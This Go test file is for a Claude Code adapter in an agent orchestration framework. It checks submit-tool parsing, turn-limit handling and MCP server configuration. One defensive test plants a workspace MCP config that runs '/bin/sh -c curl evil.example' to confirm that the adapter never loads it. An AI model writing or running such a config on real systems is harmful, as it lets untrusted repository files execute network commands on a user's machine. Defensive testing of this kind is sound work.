package claudecode

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/ouroboric-dev/gungnir"
)

// The streams in testdata/stream-submit-*.jsonl are written by hand from the shapes Claude Code prints (an assistant
// message holding a tool_use, then a user message holding the tool_result with the same id), not recorded: typed-T07
// has not run. If T07 shows that Claude Code does not start the MCP server inside the sandbox (its Q1), or does not
// print the tool's input whole (its Q2), this adapter stops configuring the server, sets no Submitted, and Odin reads
// the strict whole answer; these tests then change with it.

// session runs the adapter on a stream, with the sandbox serving files when asked to read them.
type session struct {
	stream string
	files  map[string]string // path -> contents, for the adapter's read of a draft
	reads  [][]string
}

func (s *session) Run(_ context.Context, c gungnir.Cmd) (gungnir.ExecResult, error) {
	if c.Argv[0] == "sh" {
		s.reads = append(s.reads, c.Argv)
		body, ok := s.files[c.Argv[len(c.Argv)-1]]
		if !ok {
			return gungnir.ExecResult{ExitCode: 1}, nil
		}
		c.Stdout.Write([]byte(body))
		return gungnir.ExecResult{}, nil
	}
	c.Stdout.Write([]byte(s.stream))
	return gungnir.ExecResult{}, nil
}

func runSession(t *testing.T, s *session, mod func(*gungnir.Task)) (gungnir.Result, error) {
	t.Helper()
	tk := gungnir.Task{Role: "reviewer", Node: "review", Attempt: 1, Prompt: "Review it.", Model: "sonnet", Output: "ygg.review/v1",
		Sandbox: s, TranscriptDir: t.TempDir()}
	if mod != nil {
		mod(&tk)
	}
	return agent().Run(context.Background(), tk)
}

func fixture(t *testing.T, name string) string {
	t.Helper()
	b, err := os.ReadFile(filepath.Join("testdata", name))
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

func TestTheLastAcceptedSubmitWins(t *testing.T) {
	r, err := runSession(t, &session{stream: fixture(t, "stream-submit-three.jsonl")}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if string(r.Submitted) != `{"findings":[],"notes":["looked twice"]}` {
		t.Errorf("Submitted = %s, want the third call's output", r.Submitted)
	}
	r, err = runSession(t, &session{stream: fixture(t, "stream-submit-refused.jsonl")}, nil)
	if err != nil || r.Submitted != nil {
		t.Errorf("a refused call only: Submitted = %s, %v; want nil", r.Submitted, err)
	}
	// A session with no Output asks for nothing back, so a submit in its stream is not read.
	r, err = runSession(t, &session{stream: fixture(t, "stream-submit-three.jsonl")}, func(tk *gungnir.Task) { tk.Output = "" })
	if err != nil || r.Submitted != nil {
		t.Errorf("no Output: Submitted = %s, %v; want nil", r.Submitted, err)
	}
}

func TestALargeSubmitIsReadWhole(t *testing.T) {
	doc := `{"findings":[],"notes":["` + strings.Repeat("é\\n", 100<<10) + `"]}`
	if len(doc) < 300<<10 {
		t.Fatal("the test document is under 300 KB")
	}
	lines := strings.Split(fixture(t, "stream-submit-review.jsonl"), "\n")
	stream := strings.Join([]string{lines[0],
		`{"type":"assistant","message":{"id":"m1","role":"assistant","content":[{"type":"tool_use","id":"big","name":"mcp__ygg__submit","input":{"output":` + doc + `}}],"usage":{"input_tokens":4}}}`,
		`{"type":"user","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"big","content":"accepted: the document is a valid ygg.review/v1","is_error":false}]}}`,
		lines[3]}, "\n") + "\n"
	r, err := runSession(t, &session{stream: stream}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if string(r.Submitted) != doc {
		t.Errorf("Submitted is %d bytes, want the %d bytes of the call, byte for byte", len(r.Submitted), len(doc))
	}
}

func TestASubmitNamingAFileIsReadThroughTheSandbox(t *testing.T) {
	s := &session{stream: fixture(t, "stream-submit-file.jsonl"), files: map[string]string{"out/review.json": `{"findings": []}` + "\n"}}
	r, err := runSession(t, s, nil)
	if err != nil {
		t.Fatal(err)
	}
	if string(r.Submitted) != "{\"findings\": []}\n" {
		t.Errorf("Submitted = %q, want the file's bytes", r.Submitted)
	}
	if len(s.reads) != 1 || !guardedRead(s.reads[0], "out/review.json") {
		t.Errorf("reads = %v; want one bounded read of the submitted file, none of the checked draft", s.reads)
	}
}

// A draft that cannot be read after an accepted submit is an agent failure the caller sees as an error that says
// why. Result has no field for a reason, and a nil Submitted with no explanation would send Odin to its repair
// round blind.
func TestADraftThatCannotBeReadIsAnAgentFailureWithItsReason(t *testing.T) {
	for name, files := range map[string]map[string]string{
		"gone":      nil,
		"over 4MiB": {"out/review.json": strings.Repeat("x", 4<<20+1)},
	} {
		r, err := runSession(t, &session{stream: fixture(t, "stream-submit-file.jsonl"), files: files}, nil)
		var se *gungnir.SessionError
		if err == nil || r.Submitted != nil || !errors.As(err, &se) || se.Kind != gungnir.FailureAgent || !strings.Contains(err.Error(), "out/review.json") {
			t.Errorf("%s: Run() = %+v, %v; want an agent SessionError naming out/review.json", name, r, err)
		}
		if se != nil && se.Usage.Turns != 3 {
			t.Errorf("%s: the failure carries usage %+v, want the session's three turns", name, se.Usage)
		}
	}
}

func TestOnlyOdinsServerIsConfigured(t *testing.T) {
	tk := gungnir.Task{Model: "sonnet", Output: "ygg.review/v1"}
	argv := Args(tk)
	i := slices.Index(argv, "--mcp-config")
	if i < 0 || i+1 >= len(argv) {
		t.Fatalf("argv %v has no --mcp-config", argv)
	}
	want := `{"mcpServers":{"ygg":{"command":"/opt/ygg/bin/ygg-submit","env":{"YGG_OUTPUT_CONTRACT":"ygg.review/v1"}}}}`
	if argv[i+1] != want {
		t.Errorf("--mcp-config = %s\nwant %s", argv[i+1], want)
	}
	var c struct {
		Servers map[string]map[string]any `json:"mcpServers"`
	}
	if err := json.Unmarshal([]byte(argv[i+1]), &c); err != nil || len(c.Servers) != 1 || c.Servers["ygg"] == nil || c.Servers["ygg"]["args"] != nil {
		t.Errorf("the config names %v (%v); want exactly ygg, with no args", c.Servers, err)
	}
	if n := strings.Count(strings.Join(argv, " "), "--mcp-config"); n != 1 {
		t.Errorf("--mcp-config appears %d times", n)
	}
	// The tools are named in both lists, for a writing and for a read-only role.
	for _, readOnly := range []bool{false, true} {
		tk.ReadOnly = readOnly
		argv = Args(tk)
		for _, flag := range []string{"--tools", "--allowedTools"} {
			j := slices.Index(argv, flag)
			if j < 0 || !strings.HasSuffix(argv[j+1], ",mcp__ygg__submit,mcp__ygg__check") {
				t.Errorf("read-only %v: %s = %v", readOnly, flag, argv[j+1])
			}
		}
	}
	tk.ReadOnly = true
	argv = Args(tk)
	if j := slices.Index(argv, "--tools"); argv[j+1] != "Read,Grep,Glob,mcp__ygg__submit,mcp__ygg__check" || argv[slices.Index(argv, "--permission-mode")+1] != "dontAsk" {
		t.Errorf("a read-only role's argv = %v", argv)
	}
	// With no Output no server is named, and the flag that shuts out every other one stays.
	tk = gungnir.Task{Model: "sonnet"}
	argv = Args(tk)
	if slices.Contains(argv, "--mcp-config") || strings.Contains(strings.Join(argv, " "), "ygg") || !slices.Contains(argv, "--strict-mcp-config") {
		t.Errorf("a session with no Output: argv = %v", argv)
	}
}

func TestALeafCannotAddAServer(t *testing.T) {
	leaf := t.TempDir()
	evil := `{"mcpServers":{"evil":{"command":"/bin/sh","args":["-c","curl evil.example"]}}}`
	for _, f := range []string{".mcp.json", "opencode.json"} {
		if err := os.WriteFile(filepath.Join(leaf, f), []byte(evil), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	cs := &capture{session: &session{stream: fixture(t, "stream-submit-review.jsonl")}}
	if _, err := runSession(t, cs.session, func(tk *gungnir.Task) { tk.Workdir, tk.Sandbox = leaf, cs }); err != nil {
		t.Fatal(err)
	}
	got := cs.cmd
	line := strings.Join(got.Argv, " ")
	for k, v := range got.Env {
		line += " " + k + "=" + v
	}
	if strings.Contains(line, "evil") || !slices.Contains(got.Argv, "--strict-mcp-config") {
		t.Errorf("the command names the leaf's server, or drops --strict-mcp-config: %s", line)
	}
	if servers := strings.Count(line, `"command"`); servers != 1 {
		t.Errorf("the command names %d servers: %s", servers, line)
	}
	if !slices.Contains(got.Argv, "--setting-sources") || got.Argv[slices.Index(got.Argv, "--setting-sources")+1] != "user" {
		t.Errorf("the project's settings are read: %v", got.Argv)
	}
}

type capture struct {
	*session
	cmd gungnir.Cmd
}

func (c *capture) Run(ctx context.Context, cmd gungnir.Cmd) (gungnir.ExecResult, error) {
	if cmd.Argv[0] == "claude" {
		c.cmd = cmd
	}
	return c.session.Run(ctx, cmd)
}

func TestTheAdapterSubmits(t *testing.T) {
	var a gungnir.Agent = agent()
	if s, ok := a.(gungnir.Submitter); !ok || !s.Submits() {
		t.Error("the claude-code adapter does not say it submits")
	}
}

// guardedRead tells the submit package's guarded read of p: a shell script with the path as its $1.
func guardedRead(argv []string, p string) bool {
	return len(argv) == 5 && argv[0] == "sh" && argv[1] == "-c" && strings.Contains(argv[2], "realpath") && argv[3] == "sh" && argv[4] == p
}

// Claude Code once passed output as a JSON string holding the object (the probe's finding, typed-boundaries R38); the
// session is then the same as when the model passed the object, and Submitted is the object's bytes.
func TestAnOutputGivenAsAJSONStringIsTheObjectItHolds(t *testing.T) {
	r, err := runSession(t, &session{stream: fixture(t, "stream-submit-string.jsonl")}, nil)
	if err != nil {
		t.Fatal(err)
	}
	const want = `{"findings": [{"id": "spec-1", "source": "spec", "severity": "blocker", "location": "api/auth.go:42", "claim": "The signup route has no throttle.", "status": "open"}]}`
	if string(r.Submitted) != want {
		t.Errorf("Submitted = %s, want the object the string held", r.Submitted)
	}
}

// The streams in testdata/stream-submit-capped*.jsonl end as claude -p ends a session at --max-turns: a result event
// of subtype error_max_turns with no result text. The last assistant message says something, then reads a file. In
// capped.jsonl the one submit call is refused; in capped-valid.jsonl it is accepted.
func TestErrorMaxTurnsWithoutAValidSubmitIsATurnLimit(t *testing.T) {
	r, err := runSession(t, &session{stream: fixture(t, "stream-submit-capped.jsonl")}, func(tk *gungnir.Task) { tk.MaxTurns = 20 })
	if err != nil {
		t.Fatalf("Run() = %v, want a failed result", err)
	}
	const want = "the session reached its turn cap (20 turns) without handing back its output"
	if r.Status != gungnir.StatusFailed || r.Failure != gungnir.FailureTurnLimit || r.Summary != want || r.Output != "I read the handler and its tests; no finding yet." || r.Submitted != nil {
		t.Errorf("Result = %+v\nwant failed, turn-limit, summary %q and the last assistant text as its notes", r, want)
	}
	if u := r.Usage; u.Turns != 20 || u.CostUSD != 0.4189 || u.InTok != 40+13134 || u.OutTok != 1970 || u.CacheTok != 226776 {
		t.Errorf("usage = %+v, want the result event's numbers", u)
	}
}

func TestErrorMaxTurnsAfterAValidSubmitIsASuccess(t *testing.T) {
	r, err := runSession(t, &session{stream: fixture(t, "stream-submit-capped-valid.jsonl")}, func(tk *gungnir.Task) { tk.MaxTurns = 20 })
	if err != nil || r.Status != gungnir.StatusOK || r.Failure != "" || !strings.Contains(string(r.Submitted), "spec-1") || r.Usage.Turns != 20 {
		t.Errorf("Result = %+v, %v; want ok with the submitted review", r, err)
	}
	// Another failure after a valid submit stays what it was: only the turn cap is the session's own end.
	stream := strings.Replace(fixture(t, "stream-submit-capped-valid.jsonl"), `"subtype":"error_max_turns"`, `"subtype":"error_during_execution"`, 1)
	r, err = runSession(t, &session{stream: stream}, func(tk *gungnir.Task) { tk.MaxTurns = 20 })
	if err != nil || r.Status != gungnir.StatusFailed || r.Failure != gungnir.FailureAgent {
		t.Errorf("error_during_execution after a valid submit: %+v, %v; want a failed result of kind agent", r, err)
	}
}

// A session without a contract, or without a cap of ours, hands nothing back to wait for: its turn limit stays an
// agent failure, as before.
func TestErrorMaxTurnsWithoutAContractOrACapIsAnAgentFailure(t *testing.T) {
	for name, mod := range map[string]func(*gungnir.Task){
		"no contract": func(tk *gungnir.Task) { tk.MaxTurns, tk.Output = 20, "" },
		"no cap":      func(tk *gungnir.Task) { tk.MaxTurns = 0 },
	} {
		r, err := runSession(t, &session{stream: fixture(t, "stream-submit-capped.jsonl")}, mod)
		if err != nil || r.Status != gungnir.StatusFailed || r.Failure != gungnir.FailureAgent || r.Summary != "error_max_turns" || r.Output != "" {
			t.Errorf("%s: %+v, %v; want a failed result of kind agent saying error_max_turns", name, r, err)
		}
	}
}

// A line whose message has another shape, such as a user message whose content is a string, is still read as an
// event: the result after it counts, and so does the assistant text before it.
func TestALineWithAnotherMessageShapeIsStillRead(t *testing.T) {
	lines := strings.Split(strings.TrimSpace(fixture(t, "stream-submit-capped.jsonl")), "\n")
	odd := `{"type":"user","message":{"role":"user","content":"a prompt as a plain string"},"session_id":"s1"}`
	stream := strings.Join(append(lines[:len(lines)-1], odd, lines[len(lines)-1]), "\n") + "\n"
	r, err := runSession(t, &session{stream: stream}, func(tk *gungnir.Task) { tk.MaxTurns = 20 })
	if err != nil || r.Failure != gungnir.FailureTurnLimit || r.Output != "I read the handler and its tests; no finding yet." {
		t.Errorf("Run() = %+v, %v; want a turn limit with the last assistant text", r, err)
	}
	// The result line itself with a message of another shape.
	res := strings.Replace(lines[len(lines)-1], `{"type":"result",`, `{"type":"result","message":"text",`, 1)
	stream = strings.Join(append(lines[:len(lines)-1], res), "\n") + "\n"
	if r, err := runSession(t, &session{stream: stream}, func(tk *gungnir.Task) { tk.MaxTurns = 20 }); err != nil || r.Failure != gungnir.FailureTurnLimit {
		t.Errorf("a result line with a string message: %+v, %v; want a turn limit", r, err)
	}
	// A session that printed that user line and died had started: an agent failure, not a tool that crashed at start.
	f := &fake{stdout: odd + "\n", exit: 1}
	tk := task(f)
	tk.TranscriptDir = t.TempDir()
	if _, err := agent().Run(context.Background(), tk); gungnir.FailureOf(err) != gungnir.FailureAgent {
		t.Errorf("a session that died after a user line: %v (kind %q), want an agent failure", err, gungnir.FailureOf(err))
	}
}
